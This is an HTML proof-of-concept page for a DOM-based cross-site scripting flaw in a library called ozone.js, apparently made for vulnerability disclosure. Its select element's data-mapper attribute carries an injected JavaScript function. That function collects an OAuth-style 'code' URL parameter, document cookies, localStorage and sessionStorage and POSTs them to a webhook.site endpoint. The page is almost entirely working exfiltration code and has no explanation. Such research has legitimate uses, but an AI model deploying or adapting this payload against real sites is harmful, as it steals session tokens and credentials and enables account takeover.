<!DOCTYPE html>
<html>
  <head>
    <title>PoC DOM XSS - ozone.js</title>
    <meta charset="UTF-8" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
    <script src="https://juanoviedo28.github.io/ozone-xss-poc/ozone.js"></script>
  </head>
  <body>
    <select
      data-src-url="/api/data"
      data-mapper="()=>{
        const code = new URLSearchParams(location.search).get('code');
        const data = {
          code,
          cookie: document.cookie,
          localStorage: {...localStorage},
          sessionStorage: {...sessionStorage}
        };
        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      }">
    </select>
  </body>
</html>
